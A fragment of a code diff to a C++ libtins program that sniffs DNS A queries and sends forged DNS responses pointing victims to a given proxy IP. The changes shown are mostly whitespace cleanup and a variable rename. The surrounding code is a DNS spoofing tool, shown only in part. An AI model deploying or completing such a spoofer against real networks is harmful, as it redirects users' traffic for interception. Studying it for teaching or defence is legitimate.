@@ -25,6 +25,7 @@ int main(int argc, char *argv[])
         printf("ex) ./[File Name] [Proxy Ip]\n");
         return 1;
     }
+
     if (pcap_findalldevs(&alldevs, errbuf) == -1)
         fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
 
@@ -67,7 +68,6 @@ int main(int argc, char *argv[])
             {
                 if (query.query_type() == DNS::A)
                 {
-
                     spoof_eth.dst_addr(eth.src_addr()); // spoof_eth.dst_addr --> Gate addr
                     spoof_eth.src_addr(eth.dst_addr()); //spoof_eth.src_addr --> My addr
                     spoof_eth.payload_type(eth.payload_type());
@@ -108,18 +108,13 @@ int main(int argc, char *argv[])
 
                         spoof_dns.recursion_available(1);
 
-                        auto pkt = EthernetII(spoof_eth.dst_addr(),spoof_eth.src_addr()) / IP(spoof_ip.dst_addr(),spoof_ip.src_addr()) / UDP(spoof_udp.dport(),spoof_udp.sport()) / spoof_dns;
+                        auto Spoof_Dns_Packet = EthernetII(spoof_eth.dst_addr(),spoof_eth.src_addr()) / IP(spoof_ip.dst_addr(),spoof_ip.src_addr()) / UDP(spoof_udp.dport(),spoof_udp.sport()) / spoof_dns;
 
-                        sender.send(pkt);
-
+                        sender.send(Spoof_Dns_Packet);
                     }
-
                 }
-
             }
         }
-
     }
-
 }
 
